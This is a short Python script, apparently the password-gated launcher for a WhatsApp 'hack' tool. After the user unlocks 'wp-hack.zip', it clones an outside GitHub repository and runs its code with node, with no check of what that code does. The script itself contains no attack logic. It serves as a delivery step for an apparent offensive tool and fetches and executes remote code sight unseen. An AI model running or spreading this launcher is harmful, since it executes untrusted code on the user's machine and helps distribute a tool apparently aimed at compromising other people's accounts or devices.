import os
import zipfile
import time

file_path = "wp-hack.zip"

if os.path.exists(file_path):
    for i in range(5):
        password = input("Enter the password: ")
        try:
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                zip_ref.extractall(pwd=password.encode())
                print("Password correct")
                time.sleep(2)
                os.system('clear')
                os.system('git clone https://github.com/Nkmods01/Wp-Lk-Sincrypt')
                os.system('node next.js')
                break
        except (zipfile.BadZipFile, RuntimeError):
            print("password is incorrect")
    else:
        print("5 attempts failed, password is incorrect")
else:
    print("File doesn't exist")
